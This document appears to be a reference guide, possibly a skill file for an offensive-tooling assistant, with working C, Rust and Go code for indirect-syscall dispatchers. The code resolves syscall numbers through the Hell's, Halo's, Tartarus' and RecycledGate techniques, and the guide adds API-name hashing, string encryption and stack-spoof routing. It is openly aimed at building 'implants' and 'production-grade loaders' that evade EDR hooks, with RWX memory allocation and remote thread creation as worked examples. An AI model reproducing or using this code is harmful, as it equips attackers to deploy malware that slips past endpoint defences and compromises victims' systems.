# Language Patterns — C, Rust, Go Dispatchers

Per-language dispatcher skeletons. SSN resolution via RecycledGate; trampolines target `syscall;ret` gadget in ntdll.

## Table of Contents

1. C (mingw-w64) — asm trampoline + RecycledGate init
2. Rust — `global_asm!` + safe wrapper
3. Go — Plan 9 asm + unsafe bridge
4. Shared SSN table init algorithm
5. Per-gate SSN resolvers in C / Rust / Go (Hell's / Halo's / Tartarus)
6. Obfuscation hooks (string hiding)
7. Arg-count variants (4 / 6 / 11 / 18)

---

## 1. C — mingw-w64

### Trampoline (`dispatch.s` — AT&T GAS syntax)

```asm
.intel_syntax noprefix
.global reCycall

# uint32_t reCycall(uint16_t ssn, uintptr_t gadget, ...args)
# RCX = ssn, RDX = gadget, R8 = arg1, R9 = arg2, stack = arg3..
# NT ABI: RCX=arg1..R9=arg4, stack[0x28..]=arg5+; R10=RCX; EAX=SSN

reCycall:
    mov eax, ecx                 # SSN → EAX
    mov r11, rdx                 # gadget → R11
    mov rcx, r8                  # shift arg1
    mov rdx, r9                  # shift arg2
    mov r10, rcx                 # syscall ABI
    mov  r8, [rsp + 0x28]        # arg3
    mov  r9, [rsp + 0x30]        # arg4
    # Shift args 5+ left by 0x10 bytes:
    sub rsp, 0x10
    mov rax, [rsp + 0x48]        # old arg5 (now at rsp+0x48 after sub)
    mov [rsp + 0x28], rax
    mov rax, [rsp + 0x50]        # arg6
    mov [rsp + 0x30], rax
    # ... continue for arg7..arg18 as needed
    mov eax, ecx                 # restore SSN (R10 move above clobbered nothing, but safe)
    call r11                     # CALL syscall;ret
    add rsp, 0x10
    ret
```

**Linker flags**: `-nostdlib -fno-ident -Wl,--gc-sections -static-libgcc`.

### Init (`dispatch.c`)

```c
#include <windows.h>
#include <stdint.h>

typedef struct {
    uint64_t *names;    // seeded hashes
    uint16_t *ssns;
    size_t    count;
    uintptr_t gadget;
} RecycledGate;

// Forward-declared trampoline
extern uint32_t reCycall(uint16_t ssn, uintptr_t gadget, ...);

// Compile-time FNV-1a with per-build seed
#define FNV_SEED 0xDEADBEEF12345678ULL
static uint64_t fnv1a(const char *s, uint64_t seed) {
    uint64_t h = seed;
    for (; *s; s++) { h ^= (uint8_t)*s; h *= 0x100000001B3ULL; }
    return h;
}

static void *GetNtdllBase(void) {
    // PEB walk via GS:[60]
    PEB *peb = (PEB *)__readgsqword(0x60);
    PEB_LDR_DATA *ldr = peb->Ldr;
    LIST_ENTRY *head = &ldr->InMemoryOrderModuleList;
    // Head -> self -> ntdll (second entry)
    LIST_ENTRY *entry = head->Flink->Flink;
    LDR_DATA_TABLE_ENTRY *ntdll = CONTAINING_RECORD(
        entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    return ntdll->DllBase;
}

static int cmp_rva(const void *a, const void *b) {
    return ((const uint32_t *)a)[1] - ((const uint32_t *)b)[1];
}

int RecycledGate_Init(RecycledGate *r) {
    void *base = GetNtdllBase();
    // Parse headers
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)((BYTE *)base +
        ((IMAGE_DOS_HEADER *)base)->e_lfanew);
    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)((BYTE *)base +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    uint32_t *names_rva = (uint32_t *)((BYTE *)base + exp->AddressOfNames);
    uint16_t *ords      = (uint16_t *)((BYTE *)base + exp->AddressOfNameOrdinals);
    uint32_t *funcs_rva = (uint32_t *)((BYTE *)base + exp->AddressOfFunctions);

    // Filter Zw*
    struct Entry { const char *name; uint32_t rva; };
    struct Entry tmp[2048]; size_t n = 0;
    for (uint32_t i = 0; i < exp->NumberOfNames; i++) {
        const char *nm = (const char *)base + names_rva[i];
        if (nm[0] == 'Z' && nm[1] == 'w') {
            tmp[n].name = nm;
            tmp[n].rva  = funcs_rva[ords[i]];
            n++;
        }
    }
    qsort(tmp, n, sizeof(tmp[0]), cmp_rva);

    // Build SSN table
    r->names = (uint64_t *)HeapAlloc(GetProcessHeap(), 0, sizeof(uint64_t) * n * 2);
    r->ssns  = (uint16_t *)HeapAlloc(GetProcessHeap(), 0, sizeof(uint16_t) * n * 2);
    r->count = 0;
    for (size_t i = 0; i < n; i++) {
        char nt_name[256]; nt_name[0] = 'N'; nt_name[1] = 't';
        for (size_t j = 2; (nt_name[j] = tmp[i].name[j]) != 0; j++);
        r->names[r->count] = fnv1a(tmp[i].name, FNV_SEED);
        r->ssns[r->count++] = (uint16_t)i;
        r->names[r->count] = fnv1a(nt_name, FNV_SEED);
        r->ssns[r->count++] = (uint16_t)i;
    }

    // Find syscall;ret gadget
    for (size_t i = 0; i < n; i++) {
        uint8_t *p = (uint8_t *)base + tmp[i].rva + 18;
        if (p[0] == 0x0F && p[1] == 0x05 && p[2] == 0xC3) {
            r->gadget = (uintptr_t)p;
            break;
        }
    }
    return r->gadget != 0;
}

uint16_t RecycledGate_Lookup(const RecycledGate *r, uint64_t hash) {
    for (size_t i = 0; i < r->count; i++)
        if (r->names[i] == hash) return r->ssns[i];
    return 0xFFFF;
}
```

### Use

```c
RecycledGate rg;
RecycledGate_Init(&rg);

#define HASH_NtAllocateVirtualMemory 0x...  // compile-time seeded hash
uint16_t ssn = RecycledGate_Lookup(&rg, HASH_NtAllocateVirtualMemory);
uint32_t status = reCycall(ssn, rg.gadget,
                           (uintptr_t)-1, (uintptr_t)&addr, 0,
                           (uintptr_t)&size, 0x3000, 0x40);
```

---

## 2. Rust

### Trampoline (`dispatch.rs`)

```rust
use core::arch::global_asm;

global_asm!(r#"
.global reCycall
reCycall:
    mov eax, ecx
    mov r11, rdx
    mov rcx, r8
    mov rdx, r9
    mov r10, rcx
    mov  r8, [rsp + 0x28]
    mov  r9, [rsp + 0x30]
    sub rsp, 0x10
    mov rax, [rsp + 0x48]
    mov [rsp + 0x28], rax
    mov rax, [rsp + 0x50]
    mov [rsp + 0x30], rax
    call r11
    add rsp, 0x10
    ret
"#);

extern "win64" {
    pub fn reCycall(ssn: u16, gadget: usize,
                    a1: usize, a2: usize, a3: usize, a4: usize,
                    a5: usize, a6: usize, a7: usize, a8: usize,
                    a9: usize, a10: usize, a11: usize) -> u32;
}
```

### Safe wrapper

```rust
use core::mem::MaybeUninit;

pub struct RecycledGate {
    table:  hashbrown::HashMap<u64, u16>,
    gadget: usize,
}

impl RecycledGate {
    pub fn init() -> Option<Self> {
        unsafe {
            let base = get_ntdll_base()?;
            let exports = parse_exports(base, |name| name.starts_with(b"Zw"))?;
            let mut sorted: Vec<_> = exports;
            sorted.sort_by_key(|e| e.rva);

            let mut table = hashbrown::HashMap::with_capacity(sorted.len() * 2);
            for (i, e) in sorted.iter().enumerate() {
                table.insert(seeded_hash(&e.name), i as u16);
                let nt_name = replace_prefix(&e.name, b"Zw", b"Nt");
                table.insert(seeded_hash(&nt_name), i as u16);
            }

            let gadget = sorted.iter().find_map(|e| {
                let addr = base + e.rva + 18;
                let bytes = core::slice::from_raw_parts(addr as *const u8, 3);
                if bytes == &[0x0F, 0x05, 0xC3] { Some(addr) } else { None }
            })?;

            Some(Self { table, gadget })
        }
    }

    pub fn dispatch11(&self, api_hash: u64, args: [usize; 11]) -> u32 {
        let ssn = *self.table.get(&api_hash).unwrap_or(&0xFFFF);
        unsafe {
            reCycall(ssn, self.gadget,
                     args[0], args[1], args[2], args[3],
                     args[4], args[5], args[6], args[7],
                     args[8], args[9], args[10])
        }
    }
}

const FNV_SEED: u64 = 0xDEADBEEF_12345678;

const fn seeded_hash(s: &[u8]) -> u64 {
    let mut h = FNV_SEED;
    let mut i = 0;
    while i < s.len() {
        h ^= s[i] as u64;
        h = h.wrapping_mul(0x100000001B3);
        i += 1;
    }
    h
}
```

### Compile-time hash constants

```rust
pub const H_NT_ALLOCATE_VIRTUAL_MEMORY: u64 = seeded_hash(b"NtAllocateVirtualMemory");
pub const H_NT_CREATE_THREAD_EX: u64 = seeded_hash(b"NtCreateThreadEx");
```

Cargo feature gate SSE/AVX when building implants: `default-features = false, features = ["small"]`. Strip with `cargo-strip` + `llvm-objcopy --strip-all`.

---

## 3. Go

### Trampoline (`asm_x64.s`)

```asm
#include "textflag.h"

// func reCycall(ssn uint16, gadget uintptr, args ...uintptr) uint32
TEXT ·reCycall(SB), NOSPLIT, $0-40
    MOVWLZX ssn+0(FP), AX          // SSN (zero-extended)
    MOVQ    gadget+8(FP), R11
    MOVQ    args+16(FP), SI        // slice data ptr
    MOVQ    args+24(FP), DI        // slice length

    // R10 = RCX convention
    // Copy args to Windows ABI positions
    MOVQ    0(SI), CX              // arg1
    MOVQ    8(SI), DX              // arg2
    MOVQ    16(SI), R8             // arg3
    MOVQ    24(SI), R9             // arg4
    MOVQ    CX, R10

    // Shadow space + up to 14 more args on stack
    SUBQ    $0xB8, SP              // 0x20 shadow + 14*8 stack args
    MOVQ    32(SI), AX; MOVQ AX, 0x20(SP)
    MOVQ    40(SI), AX; MOVQ AX, 0x28(SP)
    MOVQ    48(SI), AX; MOVQ AX, 0x30(SP)
    // ... repeat up to arg18
    // NOP pad to prevent assembler reorder
    BYTE $0x90; BYTE $0x90

    CALL    R11
    ADDQ    $0xB8, SP
    MOVL    AX, ret+40(FP)
    RET
```

`NOSPLIT` is critical: the Go runtime's stack-growth preamble would corrupt the trampoline's ABI state.

### Init (Go side)

```go
package dispatch

import (
    "sort"
    "unsafe"
)

type RecycledGate struct {
    ssn    map[uint64]uint16
    gadget uintptr
}

func reCycall(ssn uint16, gadget uintptr, args ...uintptr) uint32

const fnvSeed = 0xDEADBEEF12345678

func Init() (*RecycledGate, error) {
    base, err := getNtdllBase()
    if err != nil { return nil, err }

    exports := parseExports(base, func(name string) bool {
        return len(name) >= 2 && name[0] == 'Z' && name[1] == 'w'
    })
    sort.Slice(exports, func(i, j int) bool {
        return exports[i].rva < exports[j].rva
    })

    r := &RecycledGate{ssn: make(map[uint64]uint16, len(exports)*2)}
    for i, e := range exports {
        r.ssn[seededHash(e.name)] = uint16(i)
        r.ssn[seededHash("Nt"+e.name[2:])] = uint16(i)
    }

    for _, e := range exports {
        addr := base + e.rva + 18
        p := (*[3]byte)(unsafe.Pointer(addr))
        if p[0] == 0x0F && p[1] == 0x05 && p[2] == 0xC3 {
            r.gadget = addr
            break
        }
    }
    if r.gadget == 0 { return nil, errNoGadget }
    return r, nil
}

func (r *RecycledGate) Dispatch(hash uint64, args ...uintptr) uint32 {
    ssn, ok := r.ssn[hash]
    if !ok { return 0xC0000002 }  // STATUS_NOT_IMPLEMENTED
    return reCycall(ssn, r.gadget, args...)
}
```

**Go-specific caveats**:
- `NOSPLIT` budget is ~768 bytes of trampoline stack use. `sub sp, 0xB8` = 0xB8 = 184 bytes — fine.
- Do not call any non-`NOSPLIT` function from the trampoline. That includes `panic`, `print`, anything from the `runtime` package.
- The race detector (`-race`) will see unknown memory writes and complain about the ntdll read. Build implants with race detector off.

---

## 4. Shared SSN table init algorithm

All three languages follow the same logic:

```
1. GetNtdllBase() via PEB walk (TEB[0x60] → PEB → Ldr → InMemoryOrder[1])
2. ParseExports(base, filter="Zw*")
3. Sort by RVA ascending
4. For each (i, name):
    TABLE[seeded_hash(name)] = i
    TABLE[seeded_hash("Nt" + name[2:])] = i   # alias
5. For each sorted entry until gadget found:
    addr = base + rva + 18
    if read(addr, 3) == "0F 05 C3":
        gadget = addr; break
6. Return (TABLE, gadget)
```

The filter is always "starts with Zw", not "Nt", to avoid duplicate entries (every syscall has both a Zw* and Nt* export pointing to the same stub).

---

## 5. Per-gate SSN resolvers in C / Rust / Go

The **trampoline is identical** across all five gates (§1/§2/§3 above) — it takes `(ssn, gadget, args...)` and doesn't care how the SSN was resolved. Only the *resolver* function changes. Below: drop-in replacements for `RecycledGate_Init`'s lookup path, one per gate.

All three languages share the same gate logic; the code diverges only on syntax. Full C skeletons are given; Rust/Go reduce to the same structure with language-appropriate primitives (slices instead of raw pointers, `unsafe.Pointer` casts in Go, `*const u8` in Rust).

### 5.1 Hell's Gate

Reads the SSN from the 32-bit immediate at `stub + 4`. Works only on unhooked stubs.

**C**:
```c
// returns SSN or 0xFFFFFFFF on failure (stub hooked)
uint32_t hells_gate(void *stub_addr) {
    uint8_t *p = (uint8_t *)stub_addr;
    // verify clean prologue: 4C 8B D1 B8
    if (*(uint32_t *)p != 0xB8D18B4C) return 0xFFFFFFFF;
    return *(uint32_t *)(p + 4);
}
```

**Rust**:
```rust
pub unsafe fn hells_gate(stub: *const u8) -> Option<u32> {
    let prologue = core::ptr::read_unaligned(stub as *const u32);
    if prologue != 0xB8D18B4C { return None; }
    Some(core::ptr::read_unaligned(stub.add(4) as *const u32))
}
```

**Go**:
```go
func hellsGate(stub uintptr) (uint32, bool) {
    prologue := *(*uint32)(unsafe.Pointer(stub))
    if prologue != 0xB8D18B4C { return 0, false }
    return *(*uint32)(unsafe.Pointer(stub + 4)), true
}
```

### 5.2 Halo's Gate

When the direct stub is hooked, walk stubs at ±N × 0x20 offsets until an unhooked neighbor is found. SSN is derived from the neighbor's SSN by subtracting/adding the walk distance.

**C**:
```c
uint32_t halos_gate(void *stub_addr, int max_walk) {
    uint8_t *base = (uint8_t *)stub_addr;
    for (int delta = 1; delta <= max_walk; delta++) {
        // walk forward
        uint8_t *fwd = base + (delta * 0x20);
        if (*(uint32_t *)fwd == 0xB8D18B4C) {
            uint32_t neighbor = *(uint32_t *)(fwd + 4);
            return neighbor - delta;
        }
        // walk backward
        uint8_t *bwd = base - (delta * 0x20);
        if (*(uint32_t *)bwd == 0xB8D18B4C) {
            uint32_t neighbor = *(uint32_t *)(bwd + 4);
            return neighbor + delta;
        }
    }
    return 0xFFFFFFFF;
}
```

**Rust**:
```rust
pub unsafe fn halos_gate(stub: *const u8, max_walk: isize) -> Option<u32> {
    for delta in 1..=max_walk {
        let fwd = stub.offset(delta * 0x20);
        if core::ptr::read_unaligned(fwd as *const u32) == 0xB8D18B4C {
            let n = core::ptr::read_unaligned(fwd.add(4) as *const u32);
            return Some(n.wrapping_sub(delta as u32));
        }
        let bwd = stub.offset(-delta * 0x20);
        if core::ptr::read_unaligned(bwd as *const u32) == 0xB8D18B4C {
            let n = core::ptr::read_unaligned(bwd.add(4) as *const u32);
            return Some(n.wrapping_add(delta as u32));
        }
    }
    None
}
```

**Go**:
```go
func halosGate(stub uintptr, maxWalk int) (uint32, bool) {
    for delta := 1; delta <= maxWalk; delta++ {
        fwd := stub + uintptr(delta*0x20)
        if *(*uint32)(unsafe.Pointer(fwd)) == 0xB8D18B4C {
            n := *(*uint32)(unsafe.Pointer(fwd + 4))
            return n - uint32(delta), true
        }
        bwd := stub - uintptr(delta*0x20)
        if *(*uint32)(unsafe.Pointer(bwd)) == 0xB8D18B4C {
            n := *(*uint32)(unsafe.Pointer(bwd + 4))
            return n + uint32(delta), true
        }
    }
    return 0, false
}
```

**Gotcha**: on heavily hooked builds (Defender for Endpoint ≥ 2022 hooks *all* Nt* stubs), `max_walk` becomes unbounded without success. Cap at ~32 and fall through to RecycledGate.

### 5.3 Tartarus' Gate

Extends Halo's by accepting additional hook prologues. Recognizes `E9 rel32` (JMP), `FF 25 rel32` (indirect JMP), and preserves the neighbor-walk fallback. Most EDRs that defeat Halo's also defeat Tartarus — treat as legacy.

**C** (only the pattern-extension; wire the rest like Halo's):
```c
static int is_clean_or_resolvable(uint8_t *p, uint32_t *ssn_out) {
    // Clean Hell's prologue
    if (*(uint32_t *)p == 0xB8D18B4C) {
        *ssn_out = *(uint32_t *)(p + 4);
        return 1;
    }
    // E9 rel32 — follow the JMP target, scan first 32 bytes for `B8 imm32`
    if (p[0] == 0xE9) {
        int32_t rel = *(int32_t *)(p + 1);
        uint8_t *target = p + 5 + rel;
        for (int i = 0; i < 32; i++) {
            if (target[i] == 0xB8) {
                *ssn_out = *(uint32_t *)(target + i + 1);
                return 1;
            }
        }
    }
    return 0;
}
```

The Rust and Go variants follow the same shape — replace raw pointer arithmetic with `offset`/`unsafe.Pointer(uintptr)` respectively.

### 5.4 FreshyCalls

Same init as RecycledGate (§1/§2/§3 already shown) but without the Zw↔Nt alias expansion and without gadget caching. Use the RecycledGate init code and delete the alias-insertion and gadget-search sections; you now have FreshyCalls.

### 5.5 HWSyscall (hardware breakpoint)

Kind of a different beast — relies on VEH + DR0-3 instead of stub reading. The resolver function is absent; dispatch is redirected by the VEH handler itself. Not reducible to a drop-in resolver. See `edr-evasion` skill for the HWBP pattern when relevant.

### Composing resolvers with a fallback chain

Production implants combine strategies in priority order:

```c
uint32_t resolve_ssn(void *stub) {
    uint32_t ssn;
    ssn = hells_gate(stub);            if (ssn != 0xFFFFFFFF) return ssn;
    ssn = halos_gate(stub, 32);        if (ssn != 0xFFFFFFFF) return ssn;
    // RecycledGate lookup happens off the main path via its own name-hash table,
    // not a per-stub call — wire it into your dispatcher, not this chain.
    return 0xFFFFFFFF;
}
```

The modern choice is still **RecycledGate as the sole resolver** (hook-immune, O(1) after init). Keep the fallback chain only if you need resilience on unusual builds or you're targeting a mixed fleet.

---

## 6. Obfuscation hooks

Plaintext API names are the most triage-friendly IOC. Remove them.

### Compile-time seeded hash

FNV-1a with a build-time seed. In C use `-D FNV_SEED=0x...` and a constexpr-equivalent macro; in Rust use a `const fn`; in Go, a build-tag-controlled const. Regenerate the seed per build: `-DFNV_SEED=0x$(openssl rand -hex 8)`.

At call sites, only hex literals appear:

```c
reCycall(rg.ssn[0xA1B2C3D4DEADBEEF], ...);   // hash of "NtAllocateVirtualMemory"
```

### String table encryption (runtime)

If you need the plaintext name at some point (e.g., for logging in a debug build), store it XOR-encoded:

```c
#define XR(key, str) { /* array of str[i] ^ key[i%N] */ }
static const char nt_alloc[] = XR(KEY, "NtAllocateVirtualMemory");

// at use:
char buf[32];
for (size_t i = 0; i < sizeof(nt_alloc); i++)
    buf[i] = nt_alloc[i] ^ KEY[i % KEY_LEN];
```

Release builds drop these entirely via `#if DBG`.

---

## 7. Arg-count variants

The trampoline above handles up to ~11 args (shift logic covers 5 register args + 6 stack args = 11). For `NtCreateThreadEx` (11 args) or larger, the copy loop must extend.

Pragmatic approach: generate fixed-size variants `reCycall4`, `reCycall6`, `reCycall11`, `reCycall18`, each with exact stack-copy unrolled. Compilers optimize fixed sizes better, and the reduced dispatcher size keeps each trampoline a clean 20-30 lines of asm.

**Validation panel** (run after any dispatcher change):

| API | Args | Purpose |
|---|---|---|
| `NtAllocateVirtualMemory` | 6 | Tests 5th arg (`AllocationType`) and 6th arg (`Protect`) |
| `NtWriteVirtualMemory` | 5 | Tests full 5-arg path (return-by-buffer) |
| `NtCreateThreadEx` | 11 | Tests 11-arg variant (stress test) |
| `NtQuerySystemInformationEx` | 6 | Tests 6-arg path + byref output |
| `NtProtectVirtualMemory` | 5 | Tests RWX flip (EDR-sensitive) |

If any returns `STATUS_INVALID_PARAMETER` but the same call via `syscall.Syscall` / direct `NtApi` works, the arg shuffle is wrong. Most common cause: off-by-one in the `[rsp+0x28..]` offset calculation after the `sub rsp, 0x10` shift.

---

## 8. Real-world implementation patterns (Ashura / Beacon Wraith style)

The following patterns are battle-tested in modern extender-style projects and map well to production-grade loaders.

### Pattern A — Unified dispatch helpers by argument count

Keep wrappers centralized as `dispatch4`, `dispatch6`, `dispatch11` and route all Nt* helpers through them.

Benefits:

- one place for resolver mode switches
- one place for spoof/no-spoof policy
- fewer silent ABI regressions when adding APIs

Rust-style skeleton:

```rust
#[inline(always)]
pub unsafe fn dispatch6(fn_hash: u32, a1: u64, a2: u64, a3: u64, a4: u64, a5: u64, a6: u64) -> NTSTATUS {
    let (ssn, fnptr) = resolve_ssn_and_fn(fn_hash);

    if SYSCALL_MODE == 2 && fnptr != 0 {
        type Fn6 = unsafe extern "system" fn(u64, u64, u64, u64, u64, u64) -> NTSTATUS;
        let f: Fn6 = core::mem::transmute(fnptr);
        return f(a1, a2, a3, a4, a5, a6);
    }

    if ssn == 0 { return -1; }
    indirect_syscall6(ssn, a1, a2, a3, a4, a5, a6)
}
```

### Pattern B — Explicit syscall mode selection

Use a compile-time/runtime mode selector:

- mode 0: direct/IAT fallback (debug or compatibility)
- mode 1: indirect syscall via ntdll gate (default evasion path)
- mode 2: clean Nt* function-pointer mode

C-style selector:

```c
#if ASH_SYSCALL_MODE == 2
    typedef NTSTATUS (NTAPI *fn_t)(HANDLE, PVOID *, SIZE_T, PSIZE_T, ULONG, ULONG);
    fn_t fn = (fn_t)ASH_CLEAN_NT(H_NTALLOCATEVIRTUALMEMORY);
    return fn ? fn(process, base_addr, zero_bits, region_size, alloc_type, protect)
              : (NTSTATUS)0xC0000001L;
#else
    unsigned short ssn = ash_ssn(H_NTALLOCATEVIRTUALMEMORY);
    return ash_isyscall6(ssn, (ULONG_PTR)process, (ULONG_PTR)base_addr,
                         (ULONG_PTR)zero_bits, (ULONG_PTR)region_size,
                         (ULONG_PTR)alloc_type, (ULONG_PTR)protect);
#endif
```

### Pattern C — DESYNC/spoof as composition layer

Do not couple SSN resolution logic with stack-spoof frame construction. Keep spoof path as optional composition around resolved `(ssn, gate)`.

Rust-style routing:

```rust
let desync_ok = ctx.desync.add_rsp_x_gadget != 0
             && ctx.desync.jmp_rbx_gadget  != 0
             && recyc_gadget != 0;

if desync_ok && argc <= 4 {
    syscall::recycall_desync(num, &ctx.desync as *const _ as *const u8, a0, a1, a2, a3, recyc_gadget)
} else {
    syscall::recycall(num, recyc_gadget, a0, a1, a2, a3)
}
```

### Pattern D — Gate validation and optional randomized selection

At init, enumerate candidate stubs and accept only `0F 05 C3` at `stub+18`. Optionally select gate by deterministic seed to vary return address profile per build.

Keep this deterministic for reproducibility in debug builds.
